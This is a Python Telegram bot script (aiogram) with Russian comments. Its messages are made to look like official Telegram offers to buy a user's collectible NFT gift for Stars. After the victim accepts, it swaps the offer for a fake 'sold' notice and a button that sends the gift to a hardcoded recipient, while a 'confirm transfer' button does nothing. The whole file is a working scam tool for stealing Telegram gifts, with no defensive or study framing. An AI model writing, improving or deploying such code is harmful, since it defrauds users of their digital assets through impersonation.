import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.storage.memory import MemoryStorage

# Настройки
TOKEN = "YOUR_BOT_TOKEN"
RECIPIENT = "@recipient_username"  # Юзернейм, куда передается НФТ

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# Очередь для отправки новых сообщений с защитой от флуда
message_queue = asyncio.Queue()

# Текст оффера (с превью карточки сверху)
def build_offer_text(sender_username, amount, gift_name, gift_num):
    slug = gift_name.replace(" ", "")
    return (
        f'<b><a href="https://t.me/nft/{slug}-{gift_num}">Telegram</a></b>\n'
        f'<b>{gift_name} #{gift_num}</b>\n\n'
        f'Пользователь <b>{sender_username}</b> предлагает Вам '
        f'<b>{amount} ⭐️</b> за коллекционный предмет '
        f'<b>{gift_name} #{gift_num}</b>.\n\n'
        f'Предложение действует еще 6 ч. 0 мин..'
    )

# Клавиатура оффера (Отклонить / Принять)
def make_offer_keyboard(sender_username, amount, currency, gift_name, gift_num, lang):
    cb_data = f"a|{sender_username}|{amount}|{currency}|{gift_name}|{gift_num}|{lang}"
    decline_data = f"d|{gift_num}"
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="❌ Отклонить", callback_data=decline_data),
                InlineKeyboardButton(text="✅ Принять", callback_data=cb_data)
            ]
        ]
    )

# Текст после принятия (инструкция)
def build_accept_text(gift_name, gift_num):
    slug = gift_name.replace(" ", "")
    return (
        f'<b><a href="https://t.me/nft/{slug}-{gift_num}">Telegram</a></b>\n'
        f'<b>{gift_name} #{gift_num}</b>\n\n'
        f'🎁 <b>Коллекционный предмет:\n'
        f'<a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a> успешно продан!</b>\n\n'
        f'• Передайте коллекционный предмет покупателю для зачисления Stars.'
    )

# Клавиатура после принятия (Передать НФТ / Подтвердить передачу)
def make_accept_keyboard():
    recipient = RECIPIENT.lstrip("@")
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=" ↗  Передать НФТ", url=f"tg://send_gift?to={recipient}")],
            [InlineKeyboardButton(text=" ⊙  Подтвердить передачу", callback_data="noop")],
        ]
    )

def unpack_offer(cb_data: str):
    try:
        parts = cb_data.split("|")
        if len(parts) >= 7:
            return parts[1], int(parts[2]), parts[3], parts[4], int(parts[5]), parts[6]
    except Exception:
        pass
    return None

@dp.callback_query(F.data.startswith("a|"))
async def accept_offer(cb: CallbackQuery):
    data = unpack_offer(cb.data)
    if not data:
        await cb.answer("Ошибка данных", show_alert=True)
        return

    sender_username, amount, currency, gift_name, gift_num, lang = data
    text = build_accept_text(gift_name, gift_num)
    bcid = cb.message.business_connection_id
    chat_id = cb.message.chat.id

    try:
        # 1. Сначала полностью удаляем сообщение с оффером
        await bot.delete_business_messages(
            business_connection_id=bcid,
            message_ids=[cb.message.message_id]
        )
        
        # 2. Отправляем абсолютно новое сообщение с инструкцией и кнопками передачи
        await bot.send_message(
            chat_id=chat_id,
            text=text,
            reply_markup=make_accept_keyboard(),
            business_connection_id=bcid,
            disable_web_page_preview=False,
        )
    except Exception as e:
        logging.error(f"accept replacement error: {e}")
        await cb.answer("Не удалось обработать", show_alert=True)
        return
        
    await cb.answer()

@dp.callback_query(F.data.startswith("d|"))
async def decline_offer(cb: CallbackQuery):
    try:
        # При отклонении тоже можем просто удалить сообщение с оффером
        await bot.delete_business_messages(
            business_connection_id=cb.message.business_connection_id,
            message_ids=[cb.message.message_id]
        )
    except Exception as e:
        logging.error(f"decline delete error: {e}")
    await cb.answer("Предложение отклонено")

@dp.callback_query(F.data == "noop")
async def noop_handler(cb: CallbackQuery):
    await cb.answer("Выполните передачу по кнопке выше", show_alert=False)

# Фоновый воркер для отправки новых офферов через очередь
async def sender_worker():
    while True:
        task = await message_queue.get()
        chat_id, sender_username, amount, currency, gift_name, gift_num, lang, bcid = task
        try:
            text = build_offer_text(sender_username, amount, gift_name, gift_num)
            keyboard = make_offer_keyboard(sender_username, amount, currency, gift_name, gift_num, lang)
            
            await bot.send_message(
                chat_id=chat_id,
                text=text,
                reply_markup=keyboard,
                business_connection_id=bcid,
                disable_web_page_preview=False,
            )
        except Exception as e:
            logging.error(f"worker error: {e}")
        finally:
            message_queue.task_done()
            await asyncio.sleep(1.5)

async def main():
    asyncio.create_task(sender_worker())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
    
